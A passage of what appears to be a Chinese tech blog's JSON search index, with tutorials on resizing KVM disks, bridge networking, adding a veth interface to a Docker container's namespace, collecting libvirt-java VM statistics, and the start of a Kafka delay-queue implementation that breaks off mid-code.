~]# vgdisplay  --- Volume group --- VG Name cl System ID Format lvm2 Metadata Areas 2 Metadata Sequence No 4 VG Access read/write VG Status resizable MAX LV 0 Cur LV 2 Open LV 2 Max PV 0 Cur PV 2 Act PV 2 VG Size 98.99 GiB PE Size 4.00 MiB Total PE 25342 Alloc PE / Size 4863 / \u0026lt;19.00 GiB Free PE / Size 20479 / \u0026lt;80.00 GiB VG UUID DHf6m6-x6YZ-S9ZT-VMTw-ylo5-NnLT-ozpnjR 使用 df -TH 查看文件信息。\n[root@localhost ~]# df -TH Filesystem Type Size Used Avail Use% Mounted on devtmpfs devtmpfs 17G 0 17G 0% /dev tmpfs tmpfs 17G 0 17G 0% /dev/shm tmpfs tmpfs 17G 9.1M 17G 1% /run tmpfs tmpfs 17G 0 17G 0% /sys/fs/cgroup /dev/mapper/cl-root xfs 19G 2.0G 17G 11% / /dev/vda1 ext4 1.1G 135M 818M 15% /boot tmpfs tmpfs 3.4G 0 3.4G 0% /run/user/0 可以看出/dev/mapper/cl-root 挂载到了根目录，正是我们需要扩容的磁盘。使用以下命令进行扩容\nlvresize -L +80G /dev/mapper/cl-root 大概率会出现\n Insufficient free space: 20480 extents needed, but only 20479 available 莫名其妙的被占用了一点点磁盘空间，所以需要修改一下扩容命令。\nlvresize -L +79G /dev/mapper/cl-root 根据文件信息可以看出/dev/mapper/cl-root 的类型是 xfs，xfs类型的磁盘使用命令\nxfs_growfs /dev/mapper/cl-root 其他类型使用\nresize2fs /dev/mapper/cl-root 最后使用 df -TH 查看文件信息，可以看到已经扩容到了100GB。\n[root@localhost ~]# df -TH Filesystem Type Size Used Avail Use% Mounted on devtmpfs devtmpfs 17G 0 17G 0% /dev tmpfs tmpfs 17G 0 17G 0% /dev/shm tmpfs tmpfs 17G 9.1M 17G 1% /run tmpfs tmpfs 17G 0 17G 0% /sys/fs/cgroup /dev/mapper/cl-root xfs 104G 2.6G 101G 3% / /dev/vda1 ext4 1.1G 135M 818M 15% /boot tmpfs tmpfs 3.4G 0 3.4G 0% /run/user/0 ","permalink":"https://typesafe.cn/posts/kvm-disk-resize/","summary":"一、镜像扩容 注意：需要先关闭虚拟机才能操作，+号前面有空格，后面没有空格。\nqemu-img resize test.qcow2 +80G 原镜像磁盘大小20GB，扩容完成后可使用以下命令查看\nqemu-img info test.qcow2 输出\nimage: test.qcow2 file format: qcow2 virtual size: 100G (107374182400 bytes) disk size: 885M cluster_size: 65536 Format specific information: compat: 1.1 lazy refcounts: false refcount bits: 16 corrupt: false 二、Windows磁盘扩容 Windows磁盘扩容比较方便，进入 计算机管理\u0026gt;磁盘管理 找到新增的分区把它添加到需要的分区即可。\n三、Linux磁盘扩容 启动虚拟机后，进入虚拟机控制台，使用fdisk -l命令查看磁盘信息。\nDisk /dev/vda: 100 GiB, 107374182400 bytes, 209715200 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disklabel type: dos Disk identifier: 0xe11f7f01 Device Boot Start End Sectors Size Id Type /dev/vda1 * 2048 2099199 2097152 1G 83 Linux /dev/vda2 2099200 41943039 39843840 19G 8e Linux LVM Disk /dev/mapper/cl-root: 17 GiB, 18249416704 bytes, 35643392 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes Disk /dev/mapper/cl-swap: 2 GiB, 2147483648 bytes, 4194304 sectors Units: sectors of 1 * 512 = 512 bytes Sector size (logical/physical): 512 bytes / 512 bytes I/O size (minimum/optimal): 512 bytes / 512 bytes 可以看到这台虚拟机的磁盘大小已经有100GB了，但分区大小还是没有变化，只有初始大小20GB。","title":"KVM 虚拟机磁盘扩容"},{"content":"在Windows平台上我们习惯于使用VmWare或者virtual box来实现虚拟化，虽然它们拥有Linux版本，但大多数企业都选择了使用KVM来做Linux平台的虚拟化，因此学习掌握KVM是一项必不可少的技能。\n安装KVM 以centos为例，下面是安装KVM虚拟化的命令。\nyum install -y qemu-kvm libvirt virt-install bridge-utils 这么多软件都是什么作用？\n   软件 作用     qemu-kvm 整合了QEMU 和 KVM 的一个软件。   libvirt 封装了QEMU的接口，可以更加方便的操作虚拟机，并且提供了很多种编程语言的SDK。   virt-install 用来创建虚拟机的命令行工具。   bridge-utils Linux网桥，用来配置虚拟机的桥接网络。    kvm、qemu、qemu-kvm和libvirt到底有什么关系？\nKVM（Kernel Virtual Machine）是Linux的一个内核驱动模块，它需要CPU的支持，采用硬件辅助虚拟化技术Intel-VT、AMD-V；内存相关如Intel的EPT和AMD的RVI技术，使得它能够让Linux主机成为一个Hypervisor（虚拟机监控器）。\nQEMU是一个纯软件实现的虚拟机，它可以模拟CPU、内存、磁盘等其他硬件，让虚拟机认为自己底层就是硬件，其实这些都是QEMU模拟的，虚拟机的所有操作都要经过QEMU转译一层，也就导致了QEMU本身的性能较差。\nqemu-kvm是QEMU整合了KVM，把CPU虚拟化和内存虚拟化交给了KVM来做，自己来模拟IO设备，例如网卡和磁盘。这一套组合拳打下来，性能损失大大降低，相较于直接使用硬件，带来的损耗大概在1%-2%之间。\nlibvirt是目前使用最为广泛的对KVM虚拟机进行管理的工具和API。Libvirtd是一个daemon进程，可以被本地的virsh调用，也可以被远程的virsh调用，Libvirtd调用qemu-kvm操作虚拟机。\n启动libvirt\nsystemctl start libvirtd systemctl enable libvirtd 如果你不想使用命令行工具来管理虚拟机，可以安装 virt-manager 。\nyum install -y virt-manager 在支持x11转发的ssh客户端（例如：MobaXterm）上可以直接输入 virt-manager 来启动。\n虚拟网络类型 和vmware类型，kvm也支持多种类型的网络，主要分为三种。\n  NAT模式 虚拟机需要把流量发送到宿主机，宿主机器转换网络信息后再发出，外部机器无法感知到虚拟机的存在。此种方式宿主机器相当于一个路由器，因此宿主机上会有一个和虚拟机同网段的IP，并且虚拟机的网关地址是宿主机的这个IP。\n  主机模式 虚拟机只能互相访问，不能访问宿主机。此种方式与NAT模式类似，但它没有与虚拟机同网段的IP，因此虚拟机也不能借助于宿主机来访问外部网络。\n  桥接模式 虚拟机和宿主机都关联在一个网桥上，因此虚拟机可以与宿主机在同一个网段，并且外部机器可以直接访问到虚拟机，虚拟机也可以借助网桥来访问外部网络。\n 还有一种模式在openstack等云平台上使用较为广泛，网桥上绑定的物理网卡没有IP，对应交换机配置端口为trunk模式，虚拟机 端口连接到网桥上，并配置端口不同的VLAN tag以达到隔离和互联的目的。\n   NAT模式和主机模式都无需单独配置，接下来我们看下如何配置桥接网络。\n配置桥接网络 物理网卡绑定到网桥上之后就会导致网络断开，因此我们需要把原IP配置到网桥上。\n# 进入网卡配置文件夹 cd /etc/sysconfig/network-scripts/ # 拷贝原网卡配置文件作为桥接网卡 cp ifcfg-enp134s0f0 ifcfg-br0 修改 ifcfg-br0 中的 TYPE=Ethernet 为  TYPE=Bridge，最终效果如下：\nDEVICE=br0 ONBOOT=yes BOOTPROTO=none TYPE=Bridge IPADDR=172.16.0.52 PREFIX=16 GATEWAY=172.16.0.1 DNS1=114.114.114.114 修改ifcfg-enp134s0f0 文件删除其中的 IPADDR= NETMASK= GATEWAY= 行，并在最后添加上BRIDGE=br0，最终效果如下：\nDEVICE=\u0026#34;enp134s0f0\u0026#34; ONBOOT=yes BOOTPROTO=none TYPE=Ethernet BRIDGE=br0 最后重启网络。\nsystemctl restart network 查看网络信息也可以看到IP配置到了网桥上，网桥上又关联了物理网卡。\n[root@localhost network-scripts]# ip a 8: enp134s0f0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq master br0 state UP group default qlen 1000 link/ether 74:a4:b5:01:04:22 brd ff:ff:ff:ff:ff:ff inet6 fe80::76a4:b5ff:fe01:422/64 scope link valid_lft forever preferred_lft forever 17: br0: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 74:a4:b5:01:04:22 brd ff:ff:ff:ff:ff:ff inet 172.16.0.52/16 brd 172.16.255.255 scope global br0 valid_lft forever preferred_lft forever inet6 fe80::76a4:b5ff:fe01:422/64 scope link valid_lft forever preferred_lft forever [root@localhost network-scripts]# brctl show bridge name bridge id STP enabled interfaces br0 8000.74a4b5010422 no enp134s0f0 创建虚拟机 创建虚拟机有三种选择\n virt-install 使用命令创建虚拟机较为方便快捷，但对新手不友好，很多参数不知道如何设置。 Libvirt 使用libvirt提供的api接口进行创建，此种方式开发虚拟化平台会用到。 virt-manager 使用图形化界面创建虚拟机，此种方式较为简单，只要会用vmware，就会用virt-manager。  因此我比较推荐使用virt-manager来创建虚拟机，过程很简单，我就不发截图了。\n管理虚拟机 操作虚拟机的一些常用命令\n# 列出正在运行的虚拟机 virsh list # 列出全部的虚拟机 virsh list --all # 启动虚拟机 virsh start test # 关闭虚拟机 virsh shutdown test # 强制停止虚拟机 virsh destroy test # 彻底销毁虚拟机，会删除虚拟机配置文件，但不会删除虚拟磁盘 virsh undefine test # 设置宿主机开机时该虚拟机也开机 virsh autostart test # 解除开机启动 virsh autostart --disable test # 挂起虚拟机 virsh suspend test # 恢复挂起的虚拟机 virsh resume test # 查看虚拟机的VNC端口，得到vnc端口之后可以使用vncviewer等工具访问虚拟机 virsh vncdisplay test # 导出虚拟机xml配置文件 virsh dumpxml test \u0026gt;/root/test.xml # 修改虚拟机配置文件 virsh edit test 参考 https://blog.51cto.com/changfei/1672147\n","permalink":"https://typesafe.cn/posts/linux-kvm/","summary":"在Windows平台上我们习惯于使用VmWare或者virtual box来实现虚拟化，虽然它们拥有Linux版本，但大多数企业都选择了使用KVM来做Linux平台的虚拟化，因此学习掌握KVM是一项必不可少的技能。\n安装KVM 以centos为例，下面是安装KVM虚拟化的命令。\nyum install -y qemu-kvm libvirt virt-install bridge-utils 这么多软件都是什么作用？\n   软件 作用     qemu-kvm 整合了QEMU 和 KVM 的一个软件。   libvirt 封装了QEMU的接口，可以更加方便的操作虚拟机，并且提供了很多种编程语言的SDK。   virt-install 用来创建虚拟机的命令行工具。   bridge-utils Linux网桥，用来配置虚拟机的桥接网络。    kvm、qemu、qemu-kvm和libvirt到底有什么关系？\nKVM（Kernel Virtual Machine）是Linux的一个内核驱动模块，它需要CPU的支持，采用硬件辅助虚拟化技术Intel-VT、AMD-V；内存相关如Intel的EPT和AMD的RVI技术，使得它能够让Linux主机成为一个Hypervisor（虚拟机监控器）。\nQEMU是一个纯软件实现的虚拟机，它可以模拟CPU、内存、磁盘等其他硬件，让虚拟机认为自己底层就是硬件，其实这些都是QEMU模拟的，虚拟机的所有操作都要经过QEMU转译一层，也就导致了QEMU本身的性能较差。\nqemu-kvm是QEMU整合了KVM，把CPU虚拟化和内存虚拟化交给了KVM来做，自己来模拟IO设备，例如网卡和磁盘。这一套组合拳打下来，性能损失大大降低，相较于直接使用硬件，带来的损耗大概在1%-2%之间。\nlibvirt是目前使用最为广泛的对KVM虚拟机进行管理的工具和API。Libvirtd是一个daemon进程，可以被本地的virsh调用，也可以被远程的virsh调用，Libvirtd调用qemu-kvm操作虚拟机。\n启动libvirt\nsystemctl start libvirtd systemctl enable libvirtd 如果你不想使用命令行工具来管理虚拟机，可以安装 virt-manager 。\nyum install -y virt-manager 在支持x11转发的ssh客户端（例如：MobaXterm）上可以直接输入 virt-manager 来启动。\n虚拟网络类型 和vmware类型，kvm也支持多种类型的网络，主要分为三种。\n  NAT模式 虚拟机需要把流量发送到宿主机，宿主机器转换网络信息后再发出，外部机器无法感知到虚拟机的存在。此种方式宿主机器相当于一个路由器，因此宿主机上会有一个和虚拟机同网段的IP，并且虚拟机的网关地址是宿主机的这个IP。","title":"Linux虚拟化技术KVM"},{"content":"之前我们介绍Network Namespace（以下简称netns）和veth pair时说过docker是使用这些技术来实现的网络隔离，今天我们就来一探究竟，看下docker到底是如何做到的。\n启动一个无网络的容器 首先我们使用 --net=none 参数启动一个无网络的容器，为了方便调试，这里我们使用了centos镜像。\ndocker run -itd --name centos-test --net=none centos 启动成功之后我们进入容器内部确认一下是否无网卡。\n[root@localhost ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 28dc2e8853df centos \u0026#34;/bin/bash\u0026#34; 24 seconds ago Up 23 seconds centos-test [root@localhost ~]# docker exec -it 28dc2e8853df bash [root@28dc2e8853df /]# ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 可以看到确实只有一个本地环回网卡。\n如何查看docker对应的netns？ 当容器启动时，docker内部会自动为这个容器创建一个netns用于网络隔离，但当我们使用 ip netns list 查看时却看不到任何数据，这是因为docker把 netns 创建在了其他地方，而ip netns list命令只能读目录/var/run/netns下面的数据。\n我们可以通过以下命令来解决这个问题，方便我们学习docker网络。\n# 得到容器对应的进程 pid=docker inspect -f \u0026#39;{{.State.Pid}}\u0026#39; \u0026#34;$container_id\u0026#34; # 手动创建防止文件夹不存在 mkdir -p /var/run/netns/ # 建立软连接 ln -s /proc/$pid/ns/net /var/run/netns/$container_id 将上面的命令修改为和当前环境一致并验证netns中的网卡。\n[root@localhost ~]# docker inspect -f \u0026#39;{{.State.Pid}}\u0026#39; \u0026#34;28dc2e8853df\u0026#34; 123624 [root@localhost ~]# mkdir -p /var/run/netns/ [root@localhost ~]# ln -s /proc/123624/ns/net /var/run/netns/28dc2e8853df [root@localhost ~]# ip netns list 28dc2e8853df [root@localhost ~]# ip netns exec 28dc2e8853df ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 可以看到我们成功输出了netns中的网卡信息，并且此信息和从docker容器中看到的一致。\n给docker添加网卡 参考前面的Linux Bridge章节，我们首先创建一个网桥，然后创建一对veth pair，一端连接到网桥，一端移动到docker对应的netns中。\n# 添加网桥 brctl addbr br0 # 启动网桥 ip link set br0 up # 新增一对veth ip link add veth0-ns type veth peer name veth0-br # 将veth的一端移动到docker对应的netns中 ip link set veth0-ns netns 28dc2e8853df # 将netns中的本地环回和veth启动并配置IP ip netns exec 28dc2e8853df ip link set lo up ip netns exec 28dc2e8853df ip link set veth0-ns up ip netns exec 28dc2e8853df ip addr add 10.0.0.1/24 dev veth0-ns # 将veth的另一端启动并挂载到网桥上 ip link set veth0-br up brctl addif br0 veth0-br 最后验证netns和docker容器中的网卡信息。\n[root@localhost ~]# ip netns exec 28dc2e8853df ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 91: veth0-ns@if90: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 86:29:e6:0a:2a:cb brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.0.1/24 scope global veth0-ns valid_lft forever preferred_lft forever [root@localhost ~]# docker exec -it 28dc2e8853df bash [root@28dc2e8853df /]# ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 91: veth0-ns@if90: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default qlen 1000 link/ether 86:29:e6:0a:2a:cb brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.0.0.1/24 scope global veth0-ns valid_lft forever preferred_lft forever 可以看出我们在netns中添加的网卡在docker容器中也可以正确的显示出来，由此证明了此netns和docker容器的对应关系。当我们使用docker命令来创建容器时，docker为我们隐藏了大量细节，轻松使用几条命令便创建好了容器，但这种只知其然不知其所以然的方式对于我们掌握docker并不够，只有了解了底层原理之后才能对其功能掌握的更加深入。\n理解docker的几种网络模式 了解了docker添加网卡的原理后再来理解docker的几种网络模式就十分简单明了了，主要区别就在于是否具有独立的netns。\n   网络模式 简介     bridge 容器具有独立的netns，会将容器连接到 docker0 虚拟网桥，并配置IP地址，默认为该模式。   host 容器没有独立的netns，和宿主机共用网络。   none 容器具有独立的netns，但并没有对其进行任何网络设置。   container 容器和某一个已存在的容器共享netns。     新版docker新增了ipvlan、macvlan和overlay类型的网络，主要是为了多台宿主机器上面的docker容器隔离与通信，底层网络复杂了很多，之后我们会单独对其进行介绍。\n 最后也不要忘记清理实验环境哦。\n# 删除网桥 ip link del br0 # 删除veth pair ip link del veth0-br # 删除软连接 rm -rf /var/run/netns/28dc2e8853df # 删除容器 docker rm 28dc2e8853df -f ","permalink":"https://typesafe.cn/posts/how-to-add-port-for-docker/","summary":"之前我们介绍Network Namespace（以下简称netns）和veth pair时说过docker是使用这些技术来实现的网络隔离，今天我们就来一探究竟，看下docker到底是如何做到的。\n启动一个无网络的容器 首先我们使用 --net=none 参数启动一个无网络的容器，为了方便调试，这里我们使用了centos镜像。\ndocker run -itd --name centos-test --net=none centos 启动成功之后我们进入容器内部确认一下是否无网卡。\n[root@localhost ~]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 28dc2e8853df centos \u0026#34;/bin/bash\u0026#34; 24 seconds ago Up 23 seconds centos-test [root@localhost ~]# docker exec -it 28dc2e8853df bash [root@28dc2e8853df /]# ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 可以看到确实只有一个本地环回网卡。","title":"容器网络——如何为docker添加网卡？"},{"content":"虚拟化开发相较于普通开发是一个冷门的方向，大多数是使用Python开发，其中使用Java来做虚拟化的少之又少，资料更是少的可怜，为了实现需求我也是踩了不少坑，今天就为大家分享一下如何使用 libvirt-java 来采集KVM虚拟机的资源使用信息。\nCPU使用率 libvirt并没有直接提供获取虚拟机CPU使用率的接口，需要我们自己来计算，网上分享的代码或者公式五花八门，大部分都是错误的，经过我的测试，找到了一个相对准确的计算公式。\ncpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9) Java代码如下\n// t秒前的CPU时间 long c1 = domain.getInfo().cpuTime; Thread.sleep(1000); // 当前CPU时间 long c2 = domain.getInfo().cpuTime; // 虚拟CPU数量 int vCpus = domain.getMaxVcpus(); // t 为1秒 Double cpuUsage = 100 * (c2 - c1) / (1 * vCpus * Math.pow(10, 9)); log.debug(\u0026#34;虚拟机[{}]CPU使用率为: {}\u0026#34;, uuid, cpuUsage); 内存使用率 不要使用domain.getInfo()返回的 memory字段，虽然它注释写的是the memory in KBytes used by the domain，但它的意思真的不是虚拟机内部进程已使用的内存大小，而是从宿主机器的角度来看分配给这个虚拟机的内存它使用了多少，如果没有特殊配置，它会和maxMem字段的值是相同的。\n正确做法是使用domain.memoryStats(10)来获取，那为什么参数要输入一个10呢？这是因为10代表的是要返回的信息数量，经过我手动执行virsh dommemstat uuid 测试发现有10个参数返回，所以需要填入10。另外命令返回的unused 字段值与数组中tag=8的数据一致，最终我们获取到了未使用的内存大小，计算内存使用率更是轻轻松松。\nJava代码如下\nMemoryStatistic[] memoryStatistics = domain.memoryStats(10); Optional\u0026lt;MemoryStatistic\u0026gt; first = Arrays.stream(memoryStatistics).filter(x -\u0026gt; x.getTag() == 8).findFirst(); if (first.isPresent()) { MemoryStatistic memoryStatistic = first.get(); long unusedMemory = memoryStatistic.getValue(); long maxMemory = domain.getMaxMemory(); double memoryUsage = (maxMemory - unusedMemory) * 100.0 / maxMemory; log.debug(\u0026#34;虚拟机[{}]内存使用率为: {}\u0026#34;, uuid, memoryUsage); } 网卡数据包信息 同样libvirt并没有提供获取虚拟机网卡的接口，因此需要获取虚拟机的xml文件来查询。\n此处没有什么坑，解析xml是使用了html解析库Jsoup，xml算是html的亲戚吧，比html书写严格很多，解析数据更为方便。\n获取到网卡名称之后再获取统计信息，可以获取的数据有：\n   字段 含义     rx_bytes 接收数据包大小   rx_packets 接收数据包数量   rx_errs 接收错误数据包数量   rx_drop 接收丢弃数据包数量   tx_bytes 发送数据包大小   tx_packets 发送数据包数量   tx_errs 发送错误数据包数量   tx_drop 发送丢弃数据包数量    Java代码如下\nString xmlDesc = domain.getXMLDesc(0); Document document = Jsoup.parse(xmlDesc); // 网卡 Elements interfaces = document.getElementsByTag(\u0026#34;devices\u0026#34;).get(0).getElementsByTag(\u0026#34;interface\u0026#34;); for (Element inter : interfaces) { String interName = inter.getElementsByTag(\u0026#34;target\u0026#34;).get(0).attr(\u0026#34;dev\u0026#34;); DomainInterfaceStats domainInterfaceStats = domain.interfaceStats(interName); log.debug(\u0026#34;dev {} stats {}\u0026#34;, interName, Json.toJsonString(domainInterfaceStats)); } 磁盘IO信息 和网卡同样，libvirt也没有提供获取虚拟机磁盘的接口，还是需要获取虚拟机的xml文件来查询，获取到磁盘名称之后再获取统计信息，可以获取的数据有：\n   字段 含义     rd_req 读取请求总数   rd_bytes 读取的数据大小   wr_req 写入请求总数   wr_bytes 写入的数据大小   errs 失败次数    Java代码如下\nString xmlDesc = domain.getXMLDesc(0); Document document = Jsoup.parse(xmlDesc); // 磁盘 Elements disks = document.getElementsByTag(\u0026#34;devices\u0026#34;).get(0).getElementsByTag(\u0026#34;disk\u0026#34;); for (Element disk : disks) { String dev = disk.getElementsByTag(\u0026#34;target\u0026#34;).get(0).attr(\u0026#34;dev\u0026#34;); DomainBlockStats domainBlockStats = domain.blockStats(dev); log.debug(\u0026#34;dev {} stats {}\u0026#34;, dev, Json.toJsonString(domainBlockStats)); } 至此采集虚拟机状态信息算是告一段落，学的越多才发现不会的越多\u0026hellip;\n","permalink":"https://typesafe.cn/posts/collect-vm-stats-by-libvirt-java/","summary":"虚拟化开发相较于普通开发是一个冷门的方向，大多数是使用Python开发，其中使用Java来做虚拟化的少之又少，资料更是少的可怜，为了实现需求我也是踩了不少坑，今天就为大家分享一下如何使用 libvirt-java 来采集KVM虚拟机的资源使用信息。\nCPU使用率 libvirt并没有直接提供获取虚拟机CPU使用率的接口，需要我们自己来计算，网上分享的代码或者公式五花八门，大部分都是错误的，经过我的测试，找到了一个相对准确的计算公式。\ncpu_usage = (cpu_time_now - cpu_time_t_second_ago) * 100 / (t * vCpus * 10^9) Java代码如下\n// t秒前的CPU时间 long c1 = domain.getInfo().cpuTime; Thread.sleep(1000); // 当前CPU时间 long c2 = domain.getInfo().cpuTime; // 虚拟CPU数量 int vCpus = domain.getMaxVcpus(); // t 为1秒 Double cpuUsage = 100 * (c2 - c1) / (1 * vCpus * Math.pow(10, 9)); log.debug(\u0026#34;虚拟机[{}]CPU使用率为: {}\u0026#34;, uuid, cpuUsage); 内存使用率 不要使用domain.getInfo()返回的 memory字段，虽然它注释写的是the memory in KBytes used by the domain，但它的意思真的不是虚拟机内部进程已使用的内存大小，而是从宿主机器的角度来看分配给这个虚拟机的内存它使用了多少，如果没有特殊配置，它会和maxMem字段的值是相同的。","title":"使用libvirt-java采集KVM虚拟机状态信息"},{"content":"基于kafka实现延迟队列 kafka作为一个使用广泛的消息队列，很多人都不会陌生，但当你在网上搜索“kafka 延迟队列”，出现的都是一些讲解时间轮或者只是提供了一些思路，并没有一份真实可用的代码实现，今天我们就来打破这个现象，提供一份可运行的代码，抛砖引玉，吸引更多的大神来分享。\n基于kafka如何实现延迟队列？ 想要解决一个问题，我们需要先分解问题。kafka作为一个高性能的消息队列，只要消费能力足够，发出的消息都是会立刻收到的，因此我们需要想一个办法，让消息延迟发送出去。\n网上已经有大神给出了如下方案：\n 在发送延迟消息时不直接发送到目标topic，而是发送到一个用于处理延迟消息的topic，例如delay-minutes-1 写一段代码拉取delay-minutes-1中的消息，将满足条件的消息发送到真正的目标主题里。  就像画一匹马一样简单。\n方案是好的，但是我们还需要更多细节。\n完善细节 问题出在哪里？\n问题出在延迟消息发出去之后，代码程序就会立刻收到延迟消息，要如何处理才能让延迟消息等待一段时间才发送到真正的topic里面。\n可能有同学会觉得很简单嘛，在代码程序收到消息之后判断条件不满足，就调用sleep方法，过了一段时间我再进行下一个循环拉取消息。\n真的可行吗?\n一切好像都很美好，但这是不可行的。\n这是因为在轮询kafka拉取消息的时候，它会返回由max.poll.records配置指定的一批消息，但是当程序代码不能在max.poll.interval.ms配置的期望时间内处理这些消息的话，kafka就会认为这个消费者已经挂了，会进行rebalance，同时你这个消费者就无法再拉取到任何消息了。\n举个例子：当你需要一个24小时的延迟消息队列，在代码里面写下了Thread.sleep(1000*60*60*24);，为了不发生rebalance，你把max.poll.interval.ms 也改成了1000*60*60*24，这个时候你或许会感觉到一丝丝的怪异，我是谁？我在哪？我为什么要写出来这样的代码？\n其实我们可以更优雅的处理这个问题。\nKafkaConsumer 提供了暂停和恢复的API函数，调用消费者的暂停方法后就无法再拉取到新的消息，同时长时间不消费kafka也不会认为这个消费者已经挂掉了。另外为了能够更加优雅，我们会启动一个定时器来替换sleep。，完整流程如下图，当消费者发现消息不满足条件时，我们就暂停消费者，并把偏移量seek到上一次消费的位置以便等待下一个周期再次消费这条消息。\nJava代码实现 import com.fasterxml.jackson.core.JsonProcessingException; import com.fasterxml.jackson.databind.JsonNode; import com.fasterxml.jackson.databind.ObjectMapper; import org.apache.kafka.clients.consumer.*; import org.apache.kafka.clients.producer.KafkaProducer; import org.apache.kafka.clients.producer.ProducerConfig; import org.apache.kafka.clients.producer.ProducerRecord; import org.apache.kafka.common.TopicPartition; import org.apache.kafka.common.serialization.StringDeserializer; import org.apache.kafka.common.serialization.StringSerializer; import org.junit.jupiter.api.BeforeEach; import org.junit.jupiter.api.Test; import org.springframework.boot.test.context.SpringBootTest; import java.time.Duration; import java.util.*; import java.util.concurrent.ExecutionException; @SpringBootTest public class DelayQueueTest { private KafkaConsumer\u0026lt;String, String\u0026gt; consumer; private KafkaProducer\u0026lt;String, String\u0026gt; producer; private volatile Boolean exit = false; private final Object lock = new Object(); private final String servers = \u0026#34;\u0026#34;; @BeforeEach void initConsumer() { Properties props = new Properties(); props.put(ConsumerConfig.BOOTSTRAP_SERVERS_CONFIG, servers); props.put(ConsumerConfig.GROUP_ID_CONFIG, \u0026#34;d\u0026#34;); props.put(ConsumerConfig.ENABLE_AUTO_COMMIT_CONFIG, \u0026#34;false\u0026#34;); props.put(ConsumerConfig.AUTO_OFFSET_RESET_CONFIG, \u0026#34;earliest\u0026#34;); props.put(ConsumerConfig.ISOLATION_LEVEL_CONFIG, \u0026#34;read_committed\u0026#34;); props.put(ConsumerConfig.MAX_POLL_INTERVAL_MS_CONFIG, \u0026#34;5000\u0026#34;); consumer = new KafkaConsumer\u0026lt;\u0026gt;(props, new StringDeserializer(), new StringDeserializer()); } @BeforeEach void initProducer() { Properties props = new Properties(); props.put(ProducerConfig.BOOTSTRAP_SERVERS_CONFIG, servers); props.put(ProducerConfig.VALUE_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); props.put(ProducerConfig.KEY_SERIALIZER_CLASS_CONFIG, StringSerializer.class.getName()); producer = new KafkaProducer\u0026lt;\u0026gt;(props); } @Test void testDelayQueue() throws JsonProcessingException, InterruptedException { String topic = \u0026#34;delay-minutes-1\u0026#34;; List\u0026lt;String\u0026gt; topics = Collections.singletonList(topic); consumer.subscribe(topics); Timer timer = new Timer(); timer.schedule(new TimerTask() { @Override public void run() { synchronized (lock) { consumer.resume(consumer.paused()); lock.notify(); } } }, 0, 1000); do { synchronized (lock) { ConsumerRecords\u0026lt;String, String\u0026gt; consumerRecords = consumer.poll(Duration.ofMillis(200)); if (consumerRecords.isEmpty()) { lock.wait(); continue; } boolean timed = false; for (ConsumerRecord\u0026lt;String, String\u0026gt; consumerRecord : consumerRecords) { long timestamp = consumerRecord.timestamp(); TopicPartition topicPartition = new TopicPartition(consumerRecord.topic(), consumerRecord.partition()); if (timestamp + 60 * 1000 \u0026lt; System.currentTimeMillis()) { String value = consumerRecord.value(); ObjectMapper objectMapper = new ObjectMapper(); JsonNode jsonNode = objectMapper.readTree(value); JsonNode jsonNodeTopic = jsonNode.get(\u0026#34;topic\u0026#34;); String appTopic = null, appKey = null, appValue = null; if (jsonNodeTopic != null) { appTopic = jsonNodeTopic.asText(); } if (appTopic == null) { continue; } JsonNode jsonNodeKey = jsonNode.get(\u0026#34;key\u0026#34;); if (jsonNodeKey != null) { appKey = jsonNode.asText(); } JsonNode jsonNodeValue = jsonNode.get(\u0026#34;value\u0026#34;); if (jsonNodeValue != null) { appValue = jsonNodeValue.asText(); } // send to application topic  ProducerRecord\u0026lt;String, String\u0026gt; producerRecord = new ProducerRecord\u0026lt;\u0026gt;(appTopic, appKey, appValue); try { producer.send(producerRecord).get(); // success. commit message  OffsetAndMetadata offsetAndMetadata = new OffsetAndMetadata(consumerRecord.offset() + 1); HashMap\u0026lt;TopicPartition, OffsetAndMetadata\u0026gt; metadataHashMap = new HashMap\u0026lt;\u0026gt;(); metadataHashMap.put(topicPartition, offsetAndMetadata); consumer.commitSync(metadataHashMap); } catch (ExecutionException e) { consumer.pause(Collections.singletonList(topicPartition)); consumer.seek(topicPartition, consumerRecord.offset()); timed = true; break; } } else { 